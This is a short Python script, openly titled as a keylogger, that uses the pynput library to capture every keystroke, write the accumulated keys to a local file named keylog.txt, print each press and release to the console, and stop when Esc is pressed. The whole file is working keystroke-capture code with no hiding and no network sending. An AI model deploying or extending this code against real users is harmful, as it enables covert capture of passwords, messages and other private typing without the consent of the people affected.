# Keylogger using pynput module
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):  # Changed 'Key' to 'key' to avoid conflict
    keys.append(key)
    write_file(keys)

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def write_file(keys):
    with open('keylog.txt', 'w') as f:
        for key in keys:  # Changed 'Key' to 'key'
            # Removing single quotes from special keys
            k = str(key).replace("'", "")
            f.write(k)

            # Add space for readability
            f.write(' ')

def on_release(key):  # Changed 'Key' to 'key'
    print('{0} released'.format(key))
    if key == Key.esc:  # Reference 'Key' properly
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()